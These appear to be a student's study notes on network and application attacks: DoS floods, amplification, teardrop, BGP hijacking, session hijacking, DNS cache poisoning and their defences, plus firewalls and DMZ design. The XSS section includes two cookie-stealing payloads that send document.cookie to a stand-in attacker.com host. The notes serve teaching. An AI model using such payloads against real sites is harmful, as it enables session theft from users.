## INTERRUPTION: LOSS OF SERVICE DOS



![[Pasted image 20260408063906.png]]

## Volumetric Attacks

### ICMP Flood (Ping Flood)

Attackers send massive amounts of ping requests (ICMP Echo Requests) to the target. The victim's system gets overwhelmed trying to respond to each one, consuming bandwidth and processing power. The attacker often **spoofs source IPs** so the replies go elsewhere, making it harder to trace.

1. Works when attacker has greater bandwidth than victim

- Victim's server has a **100 Mbps** internet connection
- If the attacker can send **200 Mbps** worth of ICMP packets, the victim's road is **completely jammed**

II's purely about whether the attacker can **generate more traffic than the victim's connection can handle.**

If victim has greater bandwidth, attacker needs amplification or distribution"**
- **Amplification** → trick other servers into sending huge responses to the victim (DNS amplification)
- **Distribution** → use a botnet, thousands of machines flooding at once (DDoS)

2. **ICMP and UDP stacks have no end-to-end handshake process**. This makes flood attacks harder to detect

| Factor                        | Explanation                                                                                |
| ----------------------------- | ------------------------------------------------------------------------------------------ |
| **No connection state**       | Firewall can't say "this is a suspicious half-open connection" like it can with SYN floods |
| **Spoofed IPs**               | Every packet looks like it came from a different legitimate IP — no pattern to block       |
| **Looks like normal traffic** | A ping is a ping — it's a standard network operation                                       |
| **No session to track**       | IDS systems track behavior over a session — no session means nothing to analyze            |

**UDP Flood** Similar concept, attackers blast the target with UDP packets on random ports. Since UDP is connectionless, the victim's system has to:
1. Check if any application is listening on that port
2. Send back an ICMP "Destination Unreachable" message when nothing is

## Protocol-Based Attacks

These are smarter, they don't just flood with volume, they **exploit how a protocol is designed to work**.

### SYNC Flood 

![[Pasted image 20260408133408.png]]

This abuses the TCP three-way handshake:

- Normally: Client sends **SYN** → Server replies **SYN-ACK** → Client sends **ACK**
- In a SYN flood: The attacker sends tons of **SYN packets** but never completes the handshake (never sends the ACK)
- The server keeps half-open connections in memory waiting for the ACK that never comes, eventually exhausting its connection table

## The Problem SYN Cookies Solve

Remember the SYN flood problem:

```
Normal TCP handshake:
Client sends SYN
Server replies SYN-ACK and allocates memory 
waiting for ACK
        ↓
Attacker sends thousands of SYNs never completes ACK
        ↓
Server fills up memory with half open connections
Server runs out of resources = crashes
```

The core problem is the server **allocates memory too early** — before knowing if the client is real.

---

## What Are SYN Cookies?

SYN cookies are a clever trick where the server says:

```
"I will NOT save anything in memory when I get a SYN
Instead I will bake all the connection info 
into the SYN-ACK I send back
If a real client replies with ACK 
I will read the info back from that ACK
Only THEN will I allocate memory"
```

---

## How the Cookie is Made

When server gets a SYN it creates a **cryptographic hash** called a cookie using:

```
Cookie = hash of:
- Client IP address
- Client port
- Server IP address  
- Server port
- Secret key only server knows
- Timestamp
```

This cookie becomes the **sequence number** in the SYN-ACK response.

## Full SYN Cookie Flow

**Legitimate client:**

```
Client → SYN → Server
                ↓
        Server calculates cookie
        Cookie = hash(client IP, port, secret...)
        NO memory allocated yet ✅
                ↓
Client ← SYN-ACK (sequence = cookie) ← Server

Client → ACK (sequence = cookie + 1) → Server
                ↓
        Server receives ACK
        Recalculates expected cookie
        Cookie matches! Client is real ✅
        NOW server allocates memory
        Connection established
```

**Attacker doing SYN flood:**

```
Attacker → SYN (spoofed IP) → Server
                ↓
        Server calculates cookie
        Sends SYN-ACK to spoofed IP
        NO memory allocated ✅
                ↓
        ACK never comes back
        Server has nothing stored
        Nothing to overflow ✅
        
Attacker sends 1 million SYNs
Server just keeps calculating cookies
Zero memory used
Server stays alive ✅
```
## Why Hash and Secret Key?

You might wonder — why not just any number as the cookie?

Because the attacker could:

```
Receive SYN-ACK with sequence number 12345
Send back ACK with 12346
Fake a legitimate handshake!
```

The **secret key** prevents this:

```
Attacker gets SYN-ACK cookie
Cannot forge a valid ACK without knowing the secret key
Even if attacker completes the handshake
Server recalculates cookie and it won't match
Fake connection rejected ✅
```

**IP Null Attack** An IP packet is sent with the **protocol field set to 0** (null) and no flags set. Many older firewalls and IDS systems didn't know how to handle this malformed packet, causing them to crash or let it through — exploiting ambiguity in how the protocol handles edge cases.

## Application-Layer (Layer 7) Attacks

These are the **most sophisticated** DDoS attacks because they mimic legitimate user behavior, making them very hard to detect and filter.

---

## Session Hijack Attack

This exploits how web applications manage user sessions.

**How it works:**

1. User logs in → Server creates a **session ID** (stored in a cookie or URL)
2. Attacker **steals or forges** that session ID through:
    - Packet sniffing (on unencrypted HTTP)
    - Cross-Site Scripting (XSS)
    - Session fixation (attacker plants a known session ID before login)
3. Attacker uses that stolen session ID to **impersonate the legitimate user**
4. Server has no idea it's talking to the wrong person

**Why it's application-layer:** It targets the **authentication/session management logic** of the app itself, not the network.

---

## HTTP GET Flood

This is one of the most common application-layer DDoS attacks.

**How it works:**

1. Attacker sends a **massive number of HTTP GET requests** to the target web server
2. Each request looks completely **legitimate** — it looks just like a real user asking for a webpage
3. The server tries to process every single one:
    - Fetching files from disk
    - Querying the database
    - Rendering dynamic content
4. The server's CPU, memory, and database connections get **exhausted**

**Why it's so dangerous:**

- No malformed packets — it's all valid HTTP traffic
- Firewalls and IDS systems **can't easily block it** without also blocking real users
- Often uses **botnets** so requests come from thousands of different IPs
- Attackers often target **heavy pages** (search pages, login pages, pages with lots of DB queries) to maximize resource usage per request


## How XSS Leads to Session Hijacking

The key weapon is this one line of JavaScript:

javascript

```javascript
document.cookie
```

Session IDs are stored in cookies. If an attacker can get **their JavaScript to run in your browser**, they can steal your cookie and send it to themselves.

---

## The Two Types

### 📌 Stored XSS (Persistent)

This is the **comment on a webpage** one you remember.

**How it works:**

1. Attacker posts a comment on a forum/blog containing malicious script:

html

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

2. The website **saves that comment to the database** without sanitizing it
3. Every time ANY user loads that page, the script runs in their browser
4. Their session cookie gets silently sent to the attacker's server
5. Attacker pastes that cookie into their browser → **instant session hijack**

**Why it's dangerous:** One injection, unlimited victims, runs forever until removed.

---

### 📌 Reflected XSS (Non-Persistent)

The malicious script is **not stored** — it lives in the URL and bounces back off the server.

**How it works:**

1. The attacker crafts a malicious URL like:

```
https://bank.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

2. Server takes the `q=` parameter and **reflects it back** in the HTML response without sanitizing:

html

```html
<p>You searched for: <script>fetch(...)</script></p>
```

3. The script runs in the victim's browser
4. Cookie is stolen

**The catch:** The attacker has to **trick the victim into clicking the link** — usually done via phishing emails or fake links


## OSI Layer Mapping

| Attack Type           | Correct Layer                         | Why                                               |
| --------------------- | ------------------------------------- | ------------------------------------------------- |
| **Application-based** | **Layer 7** — Application             | Targets HTTP, HTTPS, DNS, app logic               |
| **Protocol-based**    | **Layer 3 & 4** — Network & Transport | SYN flood = Layer 4 (TCP), IP Null = Layer 3 (IP) |
| **Volumetric**        | **Layer 3 & 4** — Network & Transport | ICMP = Layer 3, UDP = Layer 4                     |

**Volumetric is not strictly Layer 4** — it spans both Layer 3 and Layer 4:

- **ICMP flood** → Layer 3 (Network) — ICMP lives at the IP level, no port numbers involved
- **UDP flood** → Layer 4 (Transport) — UDP uses ports, so it sits at transport layer

**Protocol-based** is the same situation:

- **IP Null attack** → Layer 3 (Network) — manipulates the IP header directly
- **SYN flood** → Layer 4 (Transport) — exploits the TCP handshake

---

## Full OSI DDoS Picture

```
Layer 7 - Application  →  HTTP GET flood, Session hijack, Slowloris
Layer 6 - Presentation →  SSL abuse attacks
Layer 5 - Session      →  Session exhaustion
Layer 4 - Transport    →  SYN flood, UDP flood
Layer 3 - Network      →  ICMP flood, IP Null, IP spoofing
Layer 2 - Data Link    →  MAC flooding
```
## Smurf Attack 

![[Pasted image 20260408102701.png]]

## The Broadcast Address — Key Concept

This is what makes Smurf unique. A **broadcast address** means:

- Normal IP packet → sent to **one specific machine**
- Broadcast packet → sent to **every machine on the network** at once

For example on a network of 192.168.1.x:

- Normal: send to `192.168.1.5` → only that machine gets it
- Broadcast: send to `192.168.1.255` → **every machine** on that network gets it

So the attacker only sends **one packet** but every host on that network responds — all replies going to the victim's spoofed IP.

## The Core Difference

![[Pasted image 20260408102927.png]]


## Ping Flood — Attacker Does All the Work

```
Attacker ────────────────────────→ Victim
Attacker ────────────────────────→ Victim
Attacker ────────────────────────→ Victim
(attacker must have more bandwidth than victim)
```

---

## Smurf Attack — Network Does the Work

```
Attacker sends ONE packet to broadcast address
(spoofed as victim's IP)
        ↓
Host 1 ──────────────────────────→ Victim
Host 2 ──────────────────────────→ Victim
Host 3 ──────────────────────────→ Victim
Host 4 ──────────────────────────→ Victim
... every single host on the network replies
```


## What IP Spoofing Actually Is

When you send a packet across the internet it has a **header** that contains:

- **Source IP (who sent it)**
- **Destination IP (who it's going to)**

That source IP field? **There is no verification on it whatsoever.** Anyone can manually write anything they want in that field.

Think of it like sending a physical letter:

```
You can write ANY return address on an envelope
Post office does not verify if that return address is real
Whoever receives the letter will send replies to that fake return address
```

---

## So How Does the Attacker Know Your IP?

Your IP is not secret at all. The attacker can get it by:

| Method                                 | How                                             |
| -------------------------------------- | ----------------------------------------------- |
| **You visited a website they control** | Server logs your IP automatically               |
| **Port scanning**                      | Tools like Nmap scan and find active IPs        |
| **Packet sniffing**                    | If on same network, they see your traffic       |
| **Social engineering**                 | Trick you into revealing it                     |
| **Simply googling**                    | If you've posted online, your IP may be exposed |

Your IP is handed out **freely** every time you visit any website — it has to be, otherwise the website wouldn't know where to send the response.

---

## Spoofing in the Smurf Attack Context

```
Attacker knows victim's IP = 192.168.1.10
        ↓
Attacker crafts ICMP packet manually:
┌─────────────────────────────────┐
│ Source IP:      192.168.1.10    │  ← FAKE (victim's IP written here)
│ Destination IP: 192.168.1.255   │  ← broadcast address
│ Data: ICMP Echo Request         │
└─────────────────────────────────┘
        ↓
Every host on network receives it
        ↓
They all see SOURCE = 192.168.1.10
"Oh this ping came from .10, let me reply to .10"
        ↓
All replies flood back to victim
Attacker's real IP is never involved
```

---

## The Attacker Never Touched the Victim's Machine

This is the key insight:

- No hacking of victim's laptop needed
- No malware installed on victim
- Just **writing a fake return address** on the packet
- The network itself does the rest

---

## Why Can't We Just Block Spoofed IPs?

Because by the time the flood reaches the victim:

- Traffic **appears to come from legitimate hosts** (X, Y, DNS servers etc)
- The real attacker's IP is completely hidden

This is why spoofing is so powerful — the attacker becomes **completely invisible** behind the flood.


## What is CharGEN?

**Character Generator Protocol** — a super old protocol from the 1980s.

- Originally made for **network testing**
- You send it any small request and it just **responds with a stream of random characters**
- Still running on old devices like **printers and copiers** that never got updated

```
Attacker sends:    "hello"  (5 bytes)
CharGEN responds:  "aAbBcCdDeEfFgGhH....." (hundreds of bytes)
```

Nobody uses it legitimately anymore — it's just sitting there on old devices, making it a perfect amplifier.

---

## What is NTP?

**Network Time Protocol** — still very much in use today.

- Every device on the internet uses NTP to **sync its clock**
- Your laptop, phone, server — they all ask NTP servers "what time is it?"
- NTP servers respond with the current time

**What is the monlist command?**

monlist is a **diagnostic command** built into older NTP servers:

- It was designed for admins to ask "hey NTP server, show me the last 600 hosts that contacted you"
- Perfectly legitimate admin tool

```
Attacker sends:     monlist request  (~small packet)
NTP server responds: list of 600 hosts  (~massive packet)
```

The problem:

- Request = tiny
- Response = up to **556x larger**
- Attacker spoofs victim's IP → all 600-entry responses flood the victim

---

## What is SNMP?

**Simple Network Management Protocol** — used to monitor and manage network devices.

- Network admins use it to check on **routers, switches, servers**
- "How much traffic is passing through this router?"
- "How many errors on this interface?"

**What is GetBulk?**

GetBulk is an SNMP command specifically designed to retrieve **large amounts of data at once:**

- Normal SNMP Get = ask for one piece of info
- GetBulk = ask for **everything at once** in one request

```
Attacker sends:     GetBulk request  (small)
SNMP device responds: entire device config, 
                      all interface stats,
                      all routing tables  (massive)
```

---

## All Three Together — The Pattern

You'll notice they all follow the **exact same pattern:**

|Protocol|Purpose|Why Abused|
|---|---|---|
|**CharGEN**|Network testing|Responds with large random data to any input|
|**NTP**|Clock syncing|monlist dumps 600 host entries for tiny request|
|**SNMP**|Device monitoring|GetBulk dumps entire device data for small request|

They were all **designed to return large amounts of data** — which is exactly what makes them dangerous when combined with IP spoofing.

---

##  Amplification Attack Flow

```
Attacker knows victim IP = 1.2.3.4
        ↓
Attacker uses botnet of 1000 machines
        ↓
Each botnet machine sends spoofed small requests
to thousands of NTP/CharGEN/SNMP servers
(source IP = victim's 1.2.3.4)
        ↓
Every server thinks victim is asking for data
        ↓
Thousands of MASSIVE responses all hit victim
        ↓
50x - 500x amplification × 1000 botnet machines
= victim completely obliterated
```

---

## Why "Reflectors"?

The slide calls NTP/CharGEN/SNMP servers **reflectors** — good term to remember:

- The attacker's traffic **bounces off** these servers toward the victim
- Like shining a flashlight at a mirror aimed at someone's eyes
- The servers are innocent — they're just doing their job
- Real attack origin is completely hidden behind the reflection


## Teardrop Attack

![[Pasted image 20260408111744.png]]
## Why Do Packets Get Fragmented?

The internet has a limit on how big a single packet can be called **MTU (Maximum Transmission Unit)** — typically **1500 bytes**.

If you send a large file, it gets **chopped up into fragments:**

```
Original Data (3000 bytes)
        ↓
Fragment 1: bytes 0-999
Fragment 2: bytes 1000-1999
Fragment 3: bytes 2000-2999
```

Each fragment travels independently across the network and the **receiving system reassembles them back** into the original data.

---

## What Are Reassembly Instructions?

Each fragment carries an **offset value** in its header — basically a label saying:

```
Fragment 1: "I start at byte 0,   I am 1000 bytes long"
Fragment 2: "I start at byte 1000, I am 1000 bytes long"
Fragment 3: "I start at byte 2000, I am 1000 bytes long"
```

The receiving system reads these offset labels and uses them like **puzzle piece numbers** to put everything back in order.

---

## Normal Reassembly vs Teardrop

**Normal:**

```
Frag 1: starts at 0,    length 1000  ──→ [0    to 999 ]
Frag 2: starts at 1000, length 1000  ──→ [1000 to 1999]
Frag 3: starts at 2000, length 1000  ──→ [2000 to 2999]

Perfect fit, no gaps, no overlaps ✅
```

**Teardrop Attack:**

```
Frag 1: starts at 10,  length 50  ──→ [10  to 60 ]
Frag 2: starts at 20,  length 60  ──→ [20  to 80 ]  ← overlaps frag1!
Frag 3: starts at 40,  length 30  ──→ [40  to 70 ]  ← overlaps both!
```

---

## Why Can't It Reassemble?

Think of it like a **physical jigsaw puzzle:**

```
Normal puzzle:
[piece 1][piece 2][piece 3]
Each piece fits perfectly next to each other ✅

Teardrop puzzle:
[piece 1]
    [piece 2]  ← starts in the MIDDLE of piece 1
       [piece 3]  ← starts in the MIDDLE of piece 2

The pieces physically overlap — impossible to lay flat ❌
```

The OS reassembly code tries to calculate:

- Where does fragment 2 go?
- But fragment 1 is already occupying that space
- Where does the overlap go? Do I overwrite? Do I skip?
- The OS **doesn't know what to do** and crashes or freezes

---

## Why Does it Crash the OS?

Older operating systems had **no logic to handle overlapping fragments:**

- The reassembly buffer gets corrupted
- The OS tries to write data on top of data already written
- Memory errors cascade
- **Kernel panic / Blue Screen / complete freeze**

This is why it's a **protocol-based attack** — it exploits how the OS **implements** the IP reassembly process, not the volume of traffic.

---

## Application Layer Fragmentation via HTTP

The same concept applies at Layer 7 using HTTP:

**Normal HTTP request:**

```
GET /page HTTP/1.1
Host: example.com
Content-Length: 1000
[all 1000 bytes arrive completely]
```

**HTTP Fragmentation Attack:**

```
POST /page HTTP/1.1
Content-Length: 10000   ← says it will send 10000 bytes
[sends only 500 bytes then stops]
        ↓
Server waits for remaining 9500 bytes
        ↓
Connection stays open, memory held
        ↓
Repeat thousands of times
        ↓
Server runs out of connections
```

You might recognize this — it's essentially **Slowloris** which we mentioned earlier. Same fragmentation idea but at the HTTP level.

---

## Why Do Variants Still Emerge?

| Reason                   | Explanation                                                                   |
| ------------------------ | ----------------------------------------------------------------------------- |
| **New protocols**        | Every new protocol has its own reassembly logic that could have the same flaw |
| **IoT devices**          | Printers, cameras, smart devices run old unpatched OS code                    |
| **IPv6**                 | Has its own fragmentation handling — new attack surface                       |
| **Complex interactions** | Two patched systems can still break when combined in unexpected ways          |

The patch fixes the **known overlapping offset** logic — but attackers keep finding **new edge cases** the patch didn't anticipate.

## Routing Attack
![[Pasted image 20260408112229.png]]
## What is BGP (Border Gateway Protocol)?

Think of the internet as a collection of **thousands of independent networks** called **Autonomous Systems (AS):**

- Your ISP (Comcast, Verizon) = one AS
- Google's network = one AS
- Facebook's network = one AS
- A university network = one AS

BGP is the protocol that tells all these networks **how to reach each other** — it's essentially the **postal routing system of the internet.**

```
Your laptop wants to reach Google.com
        ↓
Your ISP asks BGP: "whats the best path to Google?"
        ↓
BGP says: "go through AS1 → AS4 → AS7 → Google"
        ↓
Your traffic follows that path
```

Every AS constantly **advertises to its neighbors:**

- "Hey I can reach these IP ranges"
- "I have a short/fast path to get there"

---

## How BGP Hijacking Works

BGP has a **fundamental trust problem** — when an AS advertises a route, nobody verifies if it's telling the truth.

```
Google legitimately owns IP range 8.8.8.0/24
Google advertises: "send traffic for 8.8.8.x to me"
        ↓
Attacker's AS also advertises: 
"send traffic for 8.8.8.x to ME, I have a shorter route!"
        ↓
Other routers believe the attacker
(BGP prefers shorter/more specific routes)
        ↓
All traffic meant for Google now flows through attacker
```

The attacker can then:

- **Eavesdrop** — read all the traffic passing through
- **Modify** — tamper with data in transit
- **Black hole** — just drop all traffic = Denial of Service

## What is PutinGrad?

This was a **real BGP hijacking incident in 2017.**

```
Normal path:
US users → Google/Facebook/Microsoft servers

What actually happened:
US users → Rostelecom (Russian ISP) → then maybe destination

Rostelecom suddenly advertised BGP routes claiming:
"I have the best path to Google, Facebook, Microsoft"
        ↓
Internet routers believed it
        ↓
Traffic from those major companies 
got rerouted through Russian infrastructure
        ↓
For about 1 hour, Russian networks could see/intercept
traffic meant for major US tech companies
```

**PutinGrad** is just a nickname the security community gave it — combining Putin + Leningrad — because the traffic was routed through Russian state-owned infrastructure. Nobody officially confirmed it was intentional but the security community was deeply suspicious given the specific companies targeted.



## What is RPKI?

**Resource Public Key Infrastructure** — the fix for BGP's trust problem.

Remember the problem — BGP just **believes whatever any AS advertises.** RPKI adds **cryptographic proof:**

|Without RPKI|With RPKI|
|---|---|
|AS says "I own 8.8.8.0/24"|AS cryptographically **proves** it owns 8.8.8.0/24|
|Everyone just believes it|Other routers **verify the signature**|
|Attacker can lie freely|Attacker's fake advertisement gets **rejected**|

## Difference between CA Certificate and RPKI Certificate

![[Pasted image 20260408131147.png]]

---

## The Chain of Trust Comparison

**CA Certificate chain:**

```
Root CA (DigiCert)
    ↓ signs
Intermediate CA
    ↓ signs
google.com certificate
    ↓
Browser trusts google.com ✅
```

**RPKI Certificate chain:**

```
IANA (owns all IP addresses globally)
    ↓ signs
Regional Registry (ARIN owns North American IPs)
    ↓ signs
Google's certificate "owns 8.8.8.0/24"
    ↓
Router trusts Google's BGP announcement ✅
```

---

## The Key Difference

- **CA certificates** → prove **identity of a domain name**
- **RPKI certificates** → prove **ownership of an IP address block**

Same cryptographic technology, same concept of chain of trust — but applied to completely different problems at different layers of the internet.

## Session Hijacking
![[Pasted image 20260408131306.png]]

**Two different types** of session hijacking:

![[Pasted image 20260408132206.png]]
## Refresher: What Are Sequence Numbers?

TCP doesn't just send data blindly. Every packet has a **sequence number** to keep order:

```
Client sends:  "Hello"     → Sequence number 100
Client sends:  "How are"   → Sequence number 105  
Client sends:  "you?"      → Sequence number 112

Server uses these numbers to:
- Reassemble data in correct order
- Know which packets arrived
- Know which packet comes next
```

## How TCP Session Hijacking Works

```
Step 1: Legitimate session established
Client (you) ←────────────────→ Server
Sequence numbers flowing normally

Step 2: Attacker sniffs the network
Attacker watches packets go by
"Client is at sequence 500, server expects 501 next"

Step 3: Attacker injects at the right moment
Attacker sends packet with sequence number 501
spoofing client's IP
        ↓
Server thinks: "501 from client — perfect, expected that!"
Server accepts attacker's packet ✅

Step 4: Real client's packets get rejected
Real client sends legitimate packet with sequence 501
Server thinks: "I already got 501, this is a duplicate!"
Server REJECTS the real client ❌

Step 5: Attacker now owns the session
Server is talking to attacker thinking it's the client
Client is locked out — their packets keep getting rejected
```

---

## How is This Different From a Replay Attack?

Great question — they sound similar but are fundamentally different:

![[Pasted image 20260408132457.png]]
## Session Hijacking Exploits Weak Application Session Management"

This is where your two types of session hijacking connect. Even after a TCP session is hijacked, the **application layer adds another line of defense** — or should.

**Strong session management would have:**

|Control|How it helps|
|---|---|
|**Re-authentication for sensitive actions**|Even if TCP is hijacked, attacker can't transfer money without password|
|**Session binding to IP address**|Server notices "wait, same session but IP changed mid-session"|
|**Session binding to device fingerprint**|Browser, OS, screen resolution suddenly changed? Suspicious|
|**Short session timeouts**|Hijacked session expires quickly|
|**Encrypted sessions (TLS)**|Attacker can't read sequence numbers if traffic is encrypted|

**Weak session management means:**

```
Application blindly trusts whoever holds the TCP connection
No re-verification
No IP checking
No anomaly detection
        ↓
Once attacker hijacks TCP layer
Application layer just hands over everything
No questions asked
```

---

## Why TLS/HTTPS Basically Killed TCP Session Hijacking

This is worth understanding — modern HTTPS makes this attack nearly impossible:

```
Without HTTPS:
Packets travel in plain text
Attacker can read sequence numbers easily
Inject packets freely

With HTTPS/TLS:
Everything is encrypted end to end
Attacker sees sequence numbers (TCP header still visible)
BUT cannot inject meaningful data
Because injected packets fail cryptographic verification
Server rejects them immediately
```
HTTPS is HTTP-within-SSL/TLS. SSL (TLS) establishes a secured, bidirectional tunnel for arbitrary binary data between two hosts. HTTP is a protocol for sending requests and receiving answers, each request and answer consisting of detailed headers and (possibly) some content. HTTP is meant to run over a bidirectional tunnel for arbitrary binary data; when that tunnel is an SSL/TLS connection, then the whole is called "HTTPS".

This is why the slide says **"exploits weak application session management"** — in 2024 any properly configured HTTPS application is largely immune to pure TCP session hijacking. It's mainly a threat on:

- Unencrypted HTTP connections
- Old legacy systems
- Internal networks without TLS

## DNS Spoofing
![[Pasted image 20260408141952.png]]

## Quick Recap of DNS Spoofing

```
User asks DNS: "what is the IP for microsoft.com?"
Attacker intercepts and replies faster with fake IP
User goes to attacker's server thinking it's Microsoft
```

This affects **one user at a time**, the attacker has to race the DNS server for every single victim individually. That's exhausting and doesn't scale.

**DNS cache poisoning is the smarter, more devastating version.**

## What is DNS Caching First?

DNS servers don't look up every domain from scratch every time — that would be too slow. They **cache (remember) answers:**

```
First user asks: "what is microsoft.com?"
DNS server looks it up → 207.46.197.32
DNS server saves that answer in its cache
        ↓
Second user asks: "what is microsoft.com?"
DNS server replies instantly from cache
No lookup needed ✅
```

This cache is shared — **thousands of users** all rely on the same DNS server's cache.

---

## DNS Cache Poisoning

Instead of targeting one user at a time, the attacker **poisons the DNS server's cache itself:**

```
Attacker sends fake DNS response to the DNS SERVER
(not to individual users)
        ↓
DNS server saves the fake IP in its cache
"microsoft.com = 7.0.1.1" ← attacker's server
        ↓
Every user who asks for microsoft.com
gets the fake IP from cache
        ↓
Thousands of users redirected to attacker
Attacker only had to poison once ✅
```

## Side by Side Comparison

![[Pasted image 20260408142253.png]]

## What is a Transaction ID?

When your DNS server sends a query it tags it with a random number:

```
DNS Server sends: "what is microsoft.com?" 
Tagged with TransactionID = 4821
```

When a response comes back, the DNS server checks:

```
"Does this response have TransactionID 4821?"
Yes → accept it ✅
No  → reject it ❌
```

This was meant to be a security measure — only accept responses that match the ID you sent.

---

## The Key Problem — Attacker Does NOT Know the ID

This is the crucial point you're asking about. **The attacker has NO idea what the transaction ID is.** They cannot see it because:

```
DNS query goes from DNS server → upstream DNS server
Attacker is not in that path
Attacker cannot read the transaction ID
```

So the attacker uses **brute force** — they just guess every single possible ID:

```
Transaction IDs are 16 bit numbers
meaning only 65,535 possible values (0 to 65,535)

Attacker sends 65,535 fake responses:
ID 0001 → "microsoft.com = 7.0.1.1"
ID 0002 → "microsoft.com = 7.0.1.1"
ID 0003 → "microsoft.com = 7.0.1.1"
...
ID 4821 → "microsoft.com = 7.0.1.1"  ← this one matches!
...
ID 65535 → "microsoft.com = 7.0.1.1"
```

One of those 65,535 responses WILL have the correct ID — it's guaranteed.

---

## It's a Race Against Time

The attacker must flood all 65,535 fake responses **before the real DNS response arrives:**

```
DNS Server sends query at time 0ms
        ↓
Real DNS response arrives at ~50ms
        ↓
Attacker must flood all 65,535 fakes
in UNDER 50ms
```

Is that realistic? Unfortunately yes:

```
65,535 small UDP packets
Sent at network speed
Takes only milliseconds
Modern computers can do this easily
```

---

## Why DNS Server Accepts the First Match

```
DNS server sent query with ID 4821
        ↓
Attacker's fake ID 4821 arrives at 20ms ← accepted immediately
Cached as "microsoft.com = 7.0.1.1" ✅
        ↓
Real response arrives at 50ms with ID 4821
DNS server checks cache:
"I already have microsoft.com cached"
Real response ignored ❌
```

The DNS server has a simple rule — **first valid match wins.** Once something is cached it stops listening for more responses for that query.

---

## Why 16 bits is Too Small

```
16 bit ID = only 65,535 possibilities

Compare to modern cryptography:
256 bit key = 
115,792,089,237,316,195,423,570,985,008,687,907,853,
269,984,665,640,564,039,457,584,007,913,129,639,936
possibilities

Brute forcing 65,535 values = trivial
Brute forcing 256 bit crypto = impossible
```

This is why 65,535 IDs was never enough — it was designed in the 1980s when network speeds were slow enough that flooding 65,535 packets in 50ms was impossible. Today it's trivial.

## What is DNSSEC?

**DNS Security Extensions** — adds cryptographic signatures to DNS responses.

Remember the pattern we've seen before:

- BGP had no verification → RPKI added cryptographic certificates
- DNS had no verification → DNSSEC adds cryptographic signatures

Same concept, same solution.

**How DNSSEC works:**

```
Microsoft registers with DNSSEC:
"microsoft.com = 207.46.197.32"
[signed with Microsoft's private key]
        ↓
DNS server receives response
Verifies signature using Microsoft's public key
Signature valid ✅ → accept and cache
        ↓
Attacker sends fake response:
"microsoft.com = 7.0.1.1"
[no valid signature — attacker doesn't have Microsoft's private key]
        ↓
DNS server checks signature
Signature invalid ❌ → response rejected
Cache stays clean ✅
```

---

## DNSSEC Chain of Trust

Just like CA certificates and RPKI it uses a **chain of trust:**

```
Root DNS (.) ← signed by ICANN
        ↓
.com zone ← signed by Verisign
        ↓
microsoft.com ← signed by Microsoft
        ↓
www.microsoft.com ← verified all the way up the chain
```

Every level cryptographically vouches for the level below it — an attacker can't forge any link in that chain without the private key.

---

## All Together

```
DNS Spoofing        = race one user's query with fake response
DNS Cache Poisoning = poison the DNS server itself → affects thousands
DNSSEC              = cryptographic signatures on DNS responses
                      fake responses fail signature check
                      cache poisoning becomes impossible
```


## DDoS — Distributed Denial of Service
![[Pasted image 20260408142723.png]]

## Firewall Fundamentals
![[Pasted image 20260408144125.png]]

## Firewall Policy Example

![[Pasted image 20260408144304.png]]


## Types of Firewalls
![[Pasted image 20260408144342.png]]

📦Packet-Filtering Gateway
It is stateless. 




## Network Address Translation (NAT)
The firewall replaces the internal source IP with its own public IP before forwarding packets to the internet.

→Internal host (192.168.1.35) sends packet to external host (65.216.161.24)

→Firewall (173.203.129.90) rewrites source IP from 192.168.1.35 → 173.203.129.90

→Adds an entry in its translation table: 192.168.1.35:80 ↔ 65.216.161.24:80

→External host sees traffic from 173.203.129.90, not the internal IP

→Prevents internal hosts from being reached directly from the internet

→Enables use of private (RFC 1918) address space internally


## DMZ (Demilitarized Zone)

```
Internet ──→ [Outer Firewall] ──→ DMZ ──→ [Inner Firewall] ──→ Internal Network

DMZ = middle zone
Not fully public (has some firewall protection)
Not fully private (internet can reach it)
```

The DMZ is specifically designed for servers that **need to be reachable from the internet** but should **never have direct access to your internal network.**

→Outer firewall sits between Internet and DMZ

→Inner firewall sits between DMZ and internal network

→DMZ hosts: **web servers, email gateways, remote access servers, FTP servers**

→Systems in the DMZ must be **tightly controlled and hardened**

→**If a DMZ server is compromised, the inner firewall still protects internal resources**

**→Database servers and sensitive systems stay behind the inner firewall**

## FTP in the DMZ 

You're right that FTP is insecure:

- Transfers data in **plain text**
- **No encryption**
- **Credentials sent in clear**
- **Vulnerable to many attacks**

But some organizations still need FTP because:

- **Legacy systems require it**
- **Partners/clients only support FTP**
- **Public file distribution**

So the logic is:
```
"We HAVE to run FTP"
"FTP is risky and faces internet"
"Put it in DMZ so if attacker compromises it"
"They are trapped in DMZ"
"Internal network stays safe behind inner firewall"

vs

Putting FTP inside internal network:
"FTP gets compromised"
"Attacker now has foothold INSIDE your network"
"Access to everything — databases, HR systems, etc"
```

## Remote Access Servers — Same Logic

Remote access servers (VPN gateways, RDP servers) are also risky because:

- They are specifically designed to **let people in from outside**
- High value target for attackers
- If compromised, attacker gets network access

```
DMZ placement logic:
User from internet → connects to Remote Access Server in DMZ
                              ↓
                    Authentication happens here
                    Identity verified
                              ↓
                    Only THEN allowed through inner firewall
                    into internal network

vs

Internal network placement:
User from internet → directly hits internal network
Compromise = immediate full internal access
```

---

## The Real Purpose of DMZ Placement

|Server|Why Risky|Why Still in DMZ|
|---|---|---|
|**Web Server**|Public facing, HTTP attacks|Needs internet access, isolated if compromised|
|**Email Gateway**|Spam, malware, phishing|Must receive external email, filters before internal|
|**FTP Server**|No encryption, plain text|Legacy needs, isolated so compromise stays contained|
|**Remote Access**|Designed to let people in|Authentication checkpoint before internal access|

## Firewall Limitations

1. **Perimeter Control Only**
2. **Firewalls only protect if they control the ENTIRE perimeter**
3. **No External Protection**
4. **Cannot protect data outside the perimeter**
5. **Attractive Target**
6. Most **visible part of an installation to outsiders — prime attack target**
7. **Configuration Dependent**
8. Must be **correctly configured, updated as environment changes, and logs reviewed periodically**
9. **Limited Content Control**
10. Minor control over admitted content, **malicious code must be controlled inside the perimeter**
11. **Blind to Encryption:** Cannot inspect encrypted communications passing through


**1. Packet Filtering Firewall — Layer 3/4**

The most **basic and oldest type of firewall.** It performs a **simple check on data packets — inspecting information such as destination and origination IP address, packet type, port number, and other surface-level details** without opening the packet to examine its contents. [Compuquip](https://www.compuquip.com/blog/types-firewall-architectures)

```
Looks at: IP headers, ports, protocol
Does NOT look at: actual content inside packet
Memory: depends on subtype (static/stateless vs dynamic/stateful)
```

Its subtypes from your second image:

| Subtype       | What it means                                                        |
| ------------- | -------------------------------------------------------------------- |
